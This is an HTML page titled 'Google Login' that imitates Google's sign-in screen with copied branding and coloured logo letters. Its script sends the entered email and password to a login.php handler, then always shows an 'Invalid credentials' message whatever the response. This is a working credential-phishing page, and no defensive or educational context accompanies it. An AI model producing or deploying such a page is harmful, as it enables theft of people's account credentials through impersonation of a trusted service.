<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { padding: 40px; width: 380px; }
        .logo { text-align: center; font-size: 45px; font-weight: 500; margin-bottom: 20px; }
        .logo span:nth-child(1) { color: #4285f4; }
        .logo span:nth-child(2) { color: #ea4335; }
        .logo span:nth-child(3) { color: #fbbc05; }
        .logo span:nth-child(4) { color: #4285f4; }
        .logo span:nth-child(5) { color: #34a853; }
        .logo span:nth-child(6) { color: #ea4335; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { border-color: #1a73e8; outline: none; }
        button { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; }
        button:hover { background: #1557b0; }
        .text { text-align: center; margin: 15px 0; color: #5f6368; font-size: 14px; }
        .text a { color: #1a73e8; text-decoration: none; }
        .error { color: red; text-align: center; margin-top: 10px; display: none; }
    </style>
</head>
<body>
<div class="box">
    <div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
    <form id="loginForm">
        <input type="text" id="username" placeholder="Email or Phone" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Sign In</button>
        <div class="text"><a href="#">Forgot password?</a></div>
        <div class="text">Don't have an account? <a href="#">Create one</a></div>
        <div class="error" id="errorMsg">Invalid credentials. Please try again.</div>
    </form>
</div>
<script>
document.getElementById('loginForm').onsubmit = function(e) {
    e.preventDefault();
    var user = document.getElementById('username').value;
    var pass = document.getElementById('password').value;
    fetch('login.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'username=' + encodeURIComponent(user) + '&password=' + encodeURIComponent(pass)
    })
    .then(res => res.json())
    .then(data => {
        document.getElementById('errorMsg').style.display = 'block';
    });
};
</script>
</body>
</html>
